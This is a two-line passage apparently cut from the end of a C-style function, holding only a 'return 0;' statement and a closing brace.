  return 0;
}
